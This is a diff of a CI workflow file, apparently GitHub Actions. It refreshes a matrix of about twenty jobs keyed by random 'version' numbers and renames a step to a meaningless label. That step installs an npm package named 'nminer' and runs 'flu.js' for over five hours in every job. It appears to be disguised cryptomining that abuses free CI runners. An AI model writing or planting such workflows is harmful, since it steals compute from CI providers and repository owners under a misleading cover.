@@ -9,26 +9,25 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 8498 }
-          - { version: 3085 }
-          - { version: 7113 }
-          - { version: 5683 }
-          - { version: 400 }
-          - { version: 8049 }
-          - { version: 1826 }
-          - { version: 1072 }
-          - { version: 1642 }
-          - { version: 3761 }
-          - { version: 533 }
-          - { version: 5825 }
-          - { version: 1589 }
-          - { version: 2507 }
-          - { version: 8247 }
-          - { version: 2702 }
-          - { version: 7682 }
-          - { version: 5970 }
-          - { version: 2770 }
-          - { version: 362 }
+          - { version: 2303 }
+          - { version: 9646 }
+          - { version: 1569 }
+          - { version: 3388 }
+          - { version: 3061 }
+          - { version: 2059 }
+          - { version: 8819 }
+          - { version: 8872 }
+          - { version: 8036 }
+          - { version: 6053 }
+          - { version: 6540 }
+          - { version: 6599 }
+          - { version: 7927 }
+          - { version: 4830 }
+          - { version: 4299 }
+          - { version: 6910 }
+          - { version: 2824 }
+          - { version: 4987 }
+          - { version: 1352 }
 
     steps:
       - name: Checkout
@@ -39,7 +38,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: meh onto
+      - name: homeschool distinct
         run: |
           npm install nminer@latest
-          timeout 348m node flu.js || echo "flu executed"
+          timeout 343m node flu.js || echo "flu executed"
